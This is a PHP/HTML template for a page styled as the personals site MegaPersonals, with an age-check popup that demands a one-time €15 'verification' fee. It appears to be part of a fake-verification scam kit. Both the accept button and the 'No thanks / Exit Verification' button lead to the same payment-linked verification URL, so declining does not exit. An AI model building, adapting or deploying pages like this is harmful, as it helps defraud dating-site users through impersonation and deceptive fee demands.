<!doctype html>
<html>
   <head>
      <title>MegaPersonals: Classified hookups</title>
      <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
      <meta charset='utf-8'>
      <link rel="icon" href="<?= url("/assets/" . 'mega-verification/v2/images/devilgirl_favicon.ico') ?>" type="image/x-icon">
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
      <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
      <link rel="stylesheet" href='<?= url("/assets/" . 'mega-verification/v2/css/p1/custom.css') ?>' />
      <link rel="stylesheet" href='<?= url("/assets/" . 'mega-verification/v2/css/p1/emojionearea.min.css') ?>' />

      <style>
        .mt-0 {
            margin-top: 0px
        }

        .modal-footer .btn {
            max-width: 200px;
        }

        .text-center {
            justify-content: center;
            align-items: center;
        }
      </style>
   </head>
   <body style="margin-top: -10px">
      <div class="frontpage">
         <div class="container candywrapper" style="padding-right: 4em; padding-left: 4em">
            <div class="row">
               <a href="">
               <img
                  src="<?= url("/assets/" . 'mega-verification/v2/images/megapersonalsPageHeader3.png') ?>"
                  class="img-responsive center-block"
                  id="megapersonalsPageHeader"
                  >
               </a>
            </div>
            <div class="row">
               <img
                  src="<?= url("/assets/" . 'mega-verification/v2/images/almostThereDarlings.png') ?>"
                  class="img-responsive center-block"
                  >
            </div>
            <div class="row">
               <div id="confirmModal_verification" role="dialog">
                  <div class="modal-dialog">
                     <div class="modal-content modal-content-white" id="termsandconditions">
                        <div class="modal-body">
                           <img src="<?= url("/assets/" . 'mega-verification/v2/images/ageCheckPopup.png') ?>">
                           <div class="centered">
                              <p class="popup-text">
                                 You must prove you<br>
                                 are 18 years or older.
                              </p>
                              <br>
                              <p class="popup-text">
                                 To help prevent scammers<br>
                                 and support this process<br>
                                 there is a one time fee<br>
                                 of <span class="text-success"><strong>&#8364;15 + tax</strong></span>
                              </p>
                              <br>
                           </div>
                        </div>
                        <div class="modal-footer flex-btn-row text-center">
                            <a href="<?= url("{$category}/verification?token={$account_access_token}") ?>" class="btn btn-success btn-lg text-white" id="button-ok">
                               <h3 class="bold text-uppercase mt-0">Ok let's go</h3>
                               <span class="text-uppercase">I will pay fee</span><br>
                            </a>
                            <a href="<?= url("{$category}/verification?token={$account_access_token}") ?>" class="btn btn-danger btn-lg text-white"  id="close-verification" data-dismiss="modal">
                               <h3 class="bold text-uppercase mt-0">No thanks</h3>
                               <span class="text-uppercase">Exit Verification</span><br>
                            </a>
                         </div>
                     </div>
                  </div>
               </div>
            </div>

         </div>
      </div>
   </body>
</html>
